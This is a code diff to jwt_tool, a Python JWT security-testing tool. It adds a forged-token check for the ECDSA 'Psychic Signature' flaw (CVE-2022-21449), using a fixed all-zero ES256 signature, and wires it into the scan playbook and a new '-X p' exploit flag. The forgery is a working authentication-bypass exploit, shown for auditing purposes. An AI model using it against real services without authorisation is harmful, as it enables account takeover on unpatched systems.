@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.8 (01_05_2025)
+# JWT_Tool version 2.2.9 (01_05_2025)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.8"
+jwttoolvers = "2.2.9"
 import ssl
 import sys
 import os
@@ -296,6 +296,11 @@ def buildHead(alg, headDict):
 def checkNullSig(contents):
     jwtNull = contents.decode()+"."
     return jwtNull
+
+def checkPsySig(headDict, paylB64):
+    newHead = buildHead('ES256', headDict)
+    jwtPsy = newHead+"."+paylB64+".MAYCAQACAQA"
+    return jwtPsy
 
 def checkAlgNone(headDict, paylB64):
     alg1 = "none"
@@ -1418,6 +1423,9 @@ def scanModePlaybook():
     newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
     jwtBlankPw = newContents+"."+newSig
     jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded blank password in the config")
+    # Exploit: Psychic Signature for ECDSA (CVE-2022-21449)
+    psySig = checkPsySig(headDict, paylB64)
+    jwtOut(psySig, "Exploit: 'Psychic Signature' accepted in ECDSA signing (-X p)", "Testing if the ECDSA signing process can be fooled (CVE-2022-21449)")
     # Exploit: null signature
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
@@ -1741,6 +1749,10 @@ def runExploits():
             jwtNull = checkNullSig(contents)
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtNull, "Exploit: Null signature", desc)
+        elif args.exploit == "p":
+            jwtPsy = checkPsySig(headDict, paylB64)
+            desc = "EXPLOIT: Psychic Signature (CVE-2022-21449)\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(jwtPsy, "Exploit: Psychic Signature (CVE-2022-21449)", desc)
         elif args.exploit == "b":
             key = ""
             newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
@@ -1864,7 +1876,7 @@ if __name__ == '__main__':
     parser.add_argument("-M", "--mode", action="store",
                         help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
     parser.add_argument("-X", "--exploit", action="store",
-                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
+                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
     parser.add_argument("-ju", "--jwksurl", action="store",
                         help="URL location where you can host a spoofed JWKS")
     parser.add_argument("-S", "--sign", action="store",
@@ -2080,9 +2092,9 @@ if __name__ == '__main__':
         else:
             config['argvals']['scanMode'] = args.mode
     if args.exploit:
-        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k']:
+        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k', 'p']:
             parser.print_usage()
-            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
+            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
             exit(1)
         else:
             config['argvals']['exploitType'] = args.exploit
